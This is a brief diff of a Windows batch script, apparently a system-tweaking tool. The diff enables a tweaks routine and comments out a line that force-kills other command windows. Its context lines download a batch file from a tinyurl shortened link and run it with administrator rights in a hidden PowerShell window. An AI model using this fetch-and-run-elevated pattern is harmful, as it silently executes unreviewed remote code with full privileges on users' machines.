@@ -35,7 +35,7 @@ call :p2
 call :run
 
 :: --- Tweaks ---
-:: call :tweaks
+ call :tweaks
 
 :: --- Windows / Office activation ---
 :: call :act
@@ -80,7 +80,7 @@ exit /b 0
 %CURL% -o "%TEMP%\VZX.bat" https://tinyurl.com/ztweak >>"%LOG%" 2>&1 || call :fail "VZX dl"
 if not exist "%TEMP%\VZX.bat" call :fail "VZX absent"
 powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\VZX.bat' -Verb RunAs" >>"%LOG%" 2>&1 || call :fail "VZX launch"
-taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne VZ" >>"%LOG%" 2>&1
+::taskkill /f /fi "imagename eq cmd.exe" /fi "windowtitle ne VZ" >>"%LOG%" 2>&1
 exit /b 0
 
 :tweaks
